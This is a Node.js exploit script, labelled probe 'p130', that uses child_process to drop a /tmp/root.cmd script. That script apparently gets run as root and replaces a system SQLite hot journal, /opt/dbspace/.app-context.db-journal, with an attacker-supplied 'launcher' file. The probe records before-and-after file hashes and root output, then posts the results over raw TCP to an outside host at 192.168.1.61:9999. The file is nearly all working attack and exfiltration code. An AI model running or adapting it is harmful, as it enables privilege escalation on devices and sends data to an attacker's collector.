"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var net = require('net');
var HOST='192.168.1.61', PORT=9999;
var R={ts:new Date().toISOString(), probe:'p130', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,500));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},3000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p130info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function main(){
  var BASE='/home/owner/share/tmp/sdk_tools';
  R.results.before=run('md5sum /opt/dbspace/.app-context.db-journal; ls -la /opt/dbspace/.app-context.db-journal 2>&1',10000,1000);
  var script='#!/bin/sh\ncp '+BASE+'/appctx_hot_journal_launcher /opt/dbspace/.app-context.db-journal\nchown root:root /opt/dbspace/.app-context.db-journal\nchmod 644 /opt/dbspace/.app-context.db-journal\nmd5sum /opt/dbspace/.app-context.db-journal\nls -la /opt/dbspace/.app-context.db-journal\n#END\n';
  R.results.write=run('cat > /tmp/root.cmd <<EOF\n'+script+'EOF\nls -la /tmp/root.cmd; tail -2 /tmp/root.cmd',10000,2000);
  run('sleep 4',10000,100);
  R.results.after=run('md5sum /opt/dbspace/.app-context.db-journal; ls -la /opt/dbspace/.app-context.db-journal 2>&1',10000,1000);
  R.results.out=run('cat /tmp/root.out 2>&1 | tail -20',10000,2000);
  R.results.final='done '+new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal,20000);
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
